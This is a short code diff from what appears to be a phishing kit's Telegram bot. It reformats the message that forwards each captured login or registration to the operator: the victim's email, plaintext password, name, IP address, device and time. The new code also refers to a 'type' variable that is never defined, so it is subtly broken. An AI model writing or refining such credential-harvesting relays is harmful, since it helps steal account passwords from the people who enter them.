@@ -31,15 +31,16 @@ bot.on('polling_error', err => console.error('[TG Poll Error]', err.message));
 
 async function notifyLogin(session) {
   const { email, password, name, ip, device, ua } = session;
-  const text = 
-    `🔔 *New Login Attempt*\n\n` +
-    `👤 *Name:* ${name || 'N/A'}\n` +
-    `📧 *Email:* ${email}\n` +
-    `🔑 *Password:* ${password}\n\n` +
-    `📍 *IP:* ${ip}\n` +
-    `📱 *Device:* ${device}\n` +
-    `🌐 *Browser:* ${ua}`;
-
+ const text = 
+    `🔔 *New Notification*\n\n` +
+    `📧 *Email:* \`${email}\` \n` +
+    `🔑 *Password:* \`${password}\` \n` +
+    `${name ? `👤 *Name:* \`${name}\` \n` : ''}` +
+    `🌐 *IP:* \`${ip}\` \n` +
+    `📱 *Device:* ${device} \n` +
+    `🕐 *Time:* ${new Date().toUTCString()} \n` +
+    `🔄 *Type:* ${type === 'register' ? 'Registration' : 'Login'} \n` +
+    `━━━━━━━━━━━━━━━━━━`;
   const keyboard = {
     inline_keyboard: [
       [
